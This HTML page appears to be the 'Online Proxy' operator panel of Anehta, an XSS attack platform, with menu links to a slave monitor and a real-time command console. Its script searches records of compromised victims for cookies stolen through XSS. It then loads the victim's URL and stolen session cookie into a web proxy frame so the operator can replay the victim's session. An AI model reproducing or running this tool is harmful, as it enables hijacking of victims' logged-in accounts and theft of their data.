<html><meta http-equiv=content-type content="text/html; charset=utf-8">
	<head>
		<title>
			Anehta!
		</title>
	  <script src="../library/anehta.js" ></script>
	  <script src="../library/jQuery.js" ></script>
	  <script src="../server/js/effects.core.js"></script>
	  <script src="../server/js/ui.core.js"></script>
	  <script src="../server/js/effects.bounce.js"></script>
	  <script src="../server/js/effects.slide.js"></script>
	  <script src="../server/js/effects.shake.js"></script>
	  <!-- script src="../server/js/effects.explode.js"></script -->
	  <script src="../server/js/effects.clip.js"></script>
	  <script src="../server/js/ui.accordion.js"></script>
	  <script src="../server/js/ui.draggable.js"></script>
	  
	  <script src="../server/js/loadData.js"></script>
	  <link rel="stylesheet" type="text/css" href="css/style.css" />

</head>
<body onload="return initData();">


<img id="logo" style="float:top;z-index: 19999" src="../server/img/logo.jpg" />	
<ul id="basictab" class="basictab">	
<li style="margin: 0 0 0 188px;"><a href="../server/admin.php">Home</a></li>
<li><a href="../server/slavemonitor.php">Slave Monitor</a></li>
<li><a href="../server/rtcmd.php">RealTime CMD</a></li>
<li><a href="../server/clientproxy.php">Client Proxy</a></li>
<li class="selected"><a href="../server/onlineproxy.php">Online Proxy</a></li>
<li><a href="../server/config.php">Configure</a></li>
<li><a href="../server/help.php">Help</a></li>
</ul>


<div id="xssSites" class="wireframemenu" style="float:left;" >
<ul>
<!--
<li onMouseover="dropdownmenu(this, event, menu2, '150px')" onMouseout="delayhidemenu()" ><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
-->
</ul>
<a href="../server/rss.xml"><img style="float:top;" border="0" src="../server/img/rss.png" ></img>订阅Slave RSS</a>
</div>


<script>

// 每个页面的 dosomething可能不同
function dosomething(o){
	var slaveid = o.innerHTML;
	var whichDomain = obj_call_dropdownmenu.innerHTML;

	if (slaveid == "null"){
		return false;
	}
	
	for (i=(slaveData.record.length - 1); i>=0; i--){ // 从最新的找起
		if (typeof slaveData.record[i].xssGot.slaveCookie != "undefined"){ // 有cookie的记录
			if (slaveData.record[i].slaveWatermark == slaveid){				
				if (slaveData.record[i].xssGot.slaveCookie != "" &&  slaveData.record[i].xssGot.requestURI.indexOf("://"+whichDomain) > -1){ // cookie不为空,且是目标域下的记录
					//alert(slaveData.record[i].key);					
					// 复制URI 和 COOKIE 到proxy frame里去
					var pd = anehta.dom.getDocument(document.getElementById("proxy"));
					pd.getElementById("input").value = $.trim(slaveData.record[i].xssGot.requestURI);
					pd.getElementById("customcookie").value = "Cookie: "+$.trim(slaveData.record[i].xssGot.slaveCookie); 
					
					break;
				}								
			}
		}
	}
}

</script>
 
<div id="shiftcontainer" class="shiftcontainer" style="margin: 0 0 0 15px; float: left;">
  <div class="shadowcontainer" style="width: 850px; ">
    <div id="blackboard" class="innerdiv" style="height:650px;" >
      <iframe id="proxy" style="border: 1px solid #ccc; padding: 0; margin: 15 0 0 15px; float: left; width: 800px; height: 600px; overflow: auto;" src="../tools/glype/index.php" ></iframe>
    </div>
  </div>
</div>

<div align="center">	
	 <!--footer-->
  <div class="clear">
    <div class="line2">
    </div>
    <div class="clear">
      <label for="foot" style="color: #666666; font-size: 14px;">&copy;2008 <a href="http://anehta.googlecode.com">Anehta</a></label>
    </div>
  </div>
</div>

</body>
</html>